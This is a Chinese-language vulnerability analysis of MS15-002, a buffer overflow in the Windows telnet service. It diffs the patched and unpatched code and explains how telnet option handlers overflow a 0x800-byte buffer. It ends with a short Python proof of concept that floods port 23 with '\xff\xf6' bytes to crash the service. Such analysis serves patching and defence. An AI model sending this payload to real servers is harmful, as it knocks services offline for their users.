# MS15-002 telnet服务缓冲区溢出漏洞分析与POC构造

0x00 漏洞原理分析
===========

* * *

MS15-002是微软telnet服务中的缓冲区溢出漏洞，下面对其原理进行分析并构造POC。

telnet服务进程为tlntsvr.exe，针对每一个客户端连接会相应启动执行一个tlntsess.exe进程，补丁修补的是tlntsess.exe文件，通过补丁比对，确定漏洞位置如下，函数为

```
signed int __thiscall CRFCProtocol::ProcessDataReceivedOnSocket(CRFCProtocol *this, unsigned __int32 *a2)

```

![enter image description here](http://drops.javaweb.org/uploads/images/7e5801225f09f4350f1753b6f8687befc40a40da.jpg)

补丁前，该函数分别为：

![enter image description here](http://drops.javaweb.org/uploads/images/1d444341362e5adb006955897554870b36e23fdf.jpg)

补丁后，该函数为：

![enter image description here](http://drops.javaweb.org/uploads/images/00151677b8008cc60f07d8c687c75b28bdd2d4d5.jpg)

也就是说原来一个缓冲区变成了两个，调用完

```
(*(void (__thiscall **)(CRFCProtocol *, unsigned __int8 **, unsigned __int8 **, unsigned __int8))((char *)&off_1011008 + v12))(v2,&v13,&v9,v6)

```

之后，先对缓冲区中的数据长度进行判断，如果

```
(unsigned int)(v9 - (unsigned __int8 *)&Src - 1) <= 0x7FE 

```

则判断目标缓冲区中可容纳字符的个数，如果

```
(unsigned int)((char *)v14 + v7 - (_DWORD)&Dst) >= 0x800

```

则退出，否则执行

```
memcpy_s(v14, (char *)&v18 - (_BYTE *)v14, &Src, v9 - (unsigned __int8 *)&Src)

```

将数据拷贝到Dst缓冲区。

而补丁前，只有一个缓冲区，调用

```
(*(&off_1011008 + 3 * v7))(v3, &v14, &v13, *v6)

```

之前，先对缓冲区中的数据长度进行判定，只有当v13 - &Src <= 2048时才调用，v13 指向可用的缓冲区头部，而

```
(*(&off_1011008 + 3 * v7))(v3, &v14, &v13, *v6)

```

处调用的函数，会对v13的值进行修改，如果调用

```
void __thiscall CRFCProtocol::DoTxBinary(CRFCProtocol *this, unsigned __int8 **a2, unsigned __int8 **a3, unsigned __int8 a4)

```

函数，可以看到函数修改了参数3的值，即*a3 += 3。

![enter image description here](http://drops.javaweb.org/uploads/images/431a86ea4ad644e0d16afd8e78ca4a413bfeac44.jpg)

经过分析可以知道，如果v13 - &Src =2047，则满足v13 - &Src <= 2048条件，此时如果(*(&off_1011008 + 3 * v7))(v3, &v14, &v13, *v6)调用的是CRFCProtocol::DoTxBinary函数，且执行到了如下指令序列时，显然导致了缓冲区溢出。

```
v7 = *a3;
*v7 = -1;
v7[1] = -3;
v7[2] = a4;
v7[3] = 0;
*a3 += 3;

```

补丁后的版本，采用两个缓冲区，将临时缓冲区指针v9传递给

```
(*(void (__thiscall **)(CRFCProtocol *, unsigned __int8 **, unsigned __int8 **, unsigned __int8))((char *)&off_1011008 + v12))(v2,&v13,&v9,v6)

```

函数返回后判断v9指向的缓冲区中的数据长度，最后判断目的缓冲区剩余可用空间是否可以容纳v9指向的缓冲区中的数据，即对(unsigned int)((char *)v14 + v7 - (_DWORD)&Dst) >= 0x800的判断。

0x01 环境搭建与POC构造
===============

* * *

Win7上安装并启动telnet服务端，执行net user exp 123456 /ADD增加用户exp，通过net localgroup TelnetClients exp /ADD将该用户添加至TelnetClients组，这样就能够通过telnet客户端进行登录了。

调试发现

```
signed int __thiscall CRFCProtocol::ProcessDataReceivedOnSocket(CRFCProtocol *this, unsigned __int32 *a2)

```

中_a2为接收到的数据的长度，最大为0x400，v6指向接收到的数据，显然为了触发溢出，必须在调用(_(&off_1011008 + 3 * v7))(v3, &v14, &v13, *v6)时，让数据出现膨胀，保证处理过后的Src缓冲区中的数据长度大于0x800。

![enter image description here](http://drops.javaweb.org/uploads/images/9052e7975fad71376f409d5c76ecc0334e08d06a.jpg)

查看(*(&off_1011008 + 3 * v7))(v3, &v14, &v13, *v6)处可以调用的函数，

```
void __thiscall CRFCProtocol::AreYouThere(CRFCProtocol *this, unsigned __int8 **a2, unsigned __int8 **a3, unsigned __int8 a4)

```

显然会导致数据膨胀，a4是接收到的数据中的一个字节，执行后，a3指向的缓冲区中将写入9字节的固定数据。

![enter image description here](http://drops.javaweb.org/uploads/images/1d444341362e5adb006955897554870b36e23fdf.jpg)

通过wireshark截包，简单对协议进行分析，构造POC如下，让程序多次执行CRFCProtocol::AreYouThere函数，最终触发异常。

```
import socket  
address = ('192.168.172.152', 23)  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect(address)
data = "\xff\xf6" * 0x200
s.send(data) 
s.recv(512)  
s.close()

```

运行poc，在

```
signed int __thiscall CRFCProtocol::ProcessDataReceivedOnSocket( CRFCProtocol *this, unsigned __int32 *a2)

```

处设置断点，中断后可以看到_a2 = 0x400，_(DWORD_)(_(DWORD*)(this+0x1E40)+ 0x16c8)指向接收到得数据。

![enter image description here](http://drops.javaweb.org/uploads/images/e2029370dfa78b48ee39ff1025f6519d97ecfb11.jpg)

在函数返回前设置断点，执行之后，可以看到__security_check_cookie检测到了栈溢出，触发了异常，中断到调试器。

![enter image description here](http://drops.javaweb.org/uploads/images/166fac2d33f4417f8371530776295957996baf11.jpg)